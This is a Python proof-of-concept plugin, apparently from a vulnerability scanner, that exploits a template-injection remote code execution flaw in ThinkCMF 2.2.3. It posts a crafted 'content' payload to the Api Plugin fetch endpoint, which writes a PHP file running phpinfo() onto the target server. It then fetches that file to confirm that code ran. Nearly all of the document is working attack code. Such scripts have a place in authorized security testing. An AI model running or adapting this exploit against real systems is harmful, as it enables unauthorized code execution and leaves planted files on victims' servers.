#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'thinkcmf 2.2.3 template inject'
        self.keyword = ['thinkcmf', 'php']
        self.info = 'thinkcmf 2.2.3 template inject'
        self.type = 'rce'
        self.level = 'high'
        self.refer = 'https://xz.aliyun.com/t/3529'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                url = path + "/index.php?g=Api&m=Plugin&a=fetch"
                _data = "templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents('bytestforme2.php','<?php phpinfo();')</php>"
                res = self.curl('post', url,data = _data)
                if res != None and res.status_code == 200:
                    res = self.curl('get', path + "/bytestforme2.php")
                    if res != None and res.status_code == 200 and 'php.ini' in res.text:
                        self.flag = 1
                        self.req.append({"flag": url})
                        self.res.append({"info": url, "key": "thinkcmf 2.2.3 template inject"})
